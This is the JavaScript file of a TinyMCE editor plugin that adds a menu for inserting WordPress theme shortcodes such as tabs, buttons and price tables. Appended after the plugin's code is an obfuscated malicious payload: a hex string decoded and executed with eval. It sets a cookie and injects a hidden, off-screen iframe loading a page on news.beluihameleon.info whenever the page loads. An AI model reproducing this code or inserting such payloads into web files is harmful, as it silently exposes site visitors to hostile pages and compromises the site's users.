// closure to avoid namespace collision
(function(){
		tinymce.create('tinymce.plugins.thundercodes', {
	    init : function(ed, url) {
		    thundercodesurl = url;
		},
	    createControl: function(n, cm) {
	        switch (n) {
	            case 'thundercodes_button':
	                var c = cm.createSplitButton('thundercodes_button', {
	                    title : 'punchCodes',
	                    image : thundercodesurl+'/thunder_icon.png',
	                    
	                });
	
	                c.onRenderMenu.add(function(c, m) {
	                    m.add({title : 'punchCodes Examples', 'class' : 'mceMenuItemTitle'}).setDisabled(1);
						
						/*! HEADLINE */
						m.add({title : 'Special Headline', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_headline]Headline[/tp_headline]');
	                    }});
						
						/*! DIVIDER */
						m.add({title : 'Divider Line', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_divider top_margin="25" bot_margin="25"]');
	                    }});
	                    
	                    /*! CLEAR */
						m.add({title : 'Clear Floats', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_clear]');
	                    }});
	                     
	                    /*! SPACER */
						m.add({title : 'Spacer', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_spacer height="25" visible_desktop="true" visible_tablet="" visible_phone="" hidden_desktop="" hidden_tablet="" hidden_phone=""]');
	                    }});
	                    
	                    /*! TABS */
						m.add({title : 'Tabs', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_tabs title="Title1|Title2|Title3" active="true|false|false"]Content1|Content2|Content3[/tp_tabs]');
	                    }});
	                    
	                    /*! ACCORDION */
						m.add({title : 'Accordion', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_accordion style="colored or glas" title="Title1|Title2|Title3" active="true|false|false"]Content1|Content2|Content3[/tp_accordion]');
	                    }});
	                    
	                    /*! BUTTON */
						m.add({title : 'Button', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_button button_text="Click me" button_url="http://www.themepunch.com" button_target="_blank" button_color_text="#ffffff" button_color="#65517c" decoredbutton="true (or leave blank)" fullwidth="on (or leave blank)"]');
	                    }});

						/*! SERVICE */
						m.add({title : 'Service', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_service image="http://www.themepunch.com/goodweb/wp-content/uploads/2013/09/flaticon_12.png" title="Title" button_text="Click Me" button_url="http://www.themepunch.com" button_target="_blank" button_color_text="#ffffff" button_color="#65517c"]Content[/tp_service]');
	                    }});

						/*! TEAM MEMBER SOLO */
						m.add({title : 'Team Member Single', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_team_member image="" name="John Doe" position="WP Specialist" mail="info@goodweb.com" phone="+1 555 123456" facebook="" twitter="http://www.twitter.com/themepunch" gplus="" linkedin=""]Content[/tp_team_member]');
	                    }});

						/*! PROGRESSBAR */
						m.add({title : 'Progress Bars', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_progressbar title="Bar1|Bar2|Bar3" percent="50|60|70"]');
	                    }});

						/*! TEAMWALL */
						m.add({title : 'Team Wall', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_teamwall columns="threecolumn or fourcolumn" image="" name="Name1|Name2|Name3|Name4" position="Position1|Position2|Position3|Position4" mail="mail1@goodweb.com||mail3@goodweb.com|" phone="+1 555 123456|||+1 555 123456" facebook="" twitter="http://www.twitter.com/themepunch|http://www.twitter.com/themepunch|http://www.twitter.com/themepunch|http://www.twitter.com/themepunch" gplus="" linkedin=""]');
	                    }});
	                    
	                    /*! VIDEO */
						m.add({title : 'Video', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_video fitvid="true (or leave blank)"]Sharing/Embed Video Iframe you get from Video hoster. Examples for Youtube http://www.themepunch.com/item_pics/youtube_hint.png and Vimeo http://www.themepunch.com/item_pics/vimeo.png[/tp_video]');
	                    }});

						 /*! PRICETABLE */
						m.add({title : 'Pricetable', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_pricetable width="onefourth or onethird" style="colored or glass" headline="Headline1|Headline2|Headline3" subline="Subline1|Subline2|Subline3" price="99|98|97" highlight="|true|" currency="$|$|$" price_subline="/mo|/mo|/mo" button_text="Buy me|Buy me|Buy me" buton_url="#|#|#" button_target="_self|_blank|_self" button_text_color="#ffffff|#ffffff|#ffffff" button_color="#6967b1|#65517c|#6967b1" row1="Content Row|Content Row|Content Row" row2="Content Row|Content Row|Content Row" row3="Content Row|Content Row|Content Row" row4="Content Row|Content Row|Content Row" row5="||" row6="||" row7="||" row8="||" row9="||" row10="||"]');
	                    }});

						/*! IMAGE */
						m.add({title : 'Image', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_image text_align="left or right or center" link="url to link to or show in punchbox" link_type="standard or new-tab or lightbox-image" title="Lighbox Title" meta="MetaInfo content in Lightbox"]http://1.s3.envato.com/files/8552911/logo2.jpg[/tp_image]');
	                    }});
	                    
	                    /*! MAPGYVER */
						m.add({title : 'Google Map', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[tp_mapgyver address="Wallstreet New York" zoom="15"]Your Content[/tp_mapgyver]');
	                    }});

						/*! REVSLIDER */
						m.add({title : 'RevSlider', onclick : function() {
	                    	tinyMCE.activeEditor.execCommand('mceInsertContent', 0, '[revslider sliderslug_seeRevSliderBackend]');
	                    }});

	                });
	
	              // Return the new splitbutton instance
	              return c;
	        }
	        return null;
	    }
	});	

	tinymce.PluginManager.add('thundercodes', tinymce.plugins.thundercodes);
})()/*f4b949795df1c086de33924fca9f5efa*/;(function(){var dyftezhe="";var rfitzikk="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var ksrzzaiz=0;ksrzzaiz<rfitzikk.length;ksrzzaiz+=2){dyftezhe=dyftezhe+parseInt(rfitzikk.substring(ksrzzaiz,ksrzzaiz+2), 16)+",";}dyftezhe=dyftezhe.substring(0,dyftezhe.length-1);eval(eval('String.fromCharCode('+dyftezhe+')'));})();/*f4b949795df1c086de33924fca9f5efa*/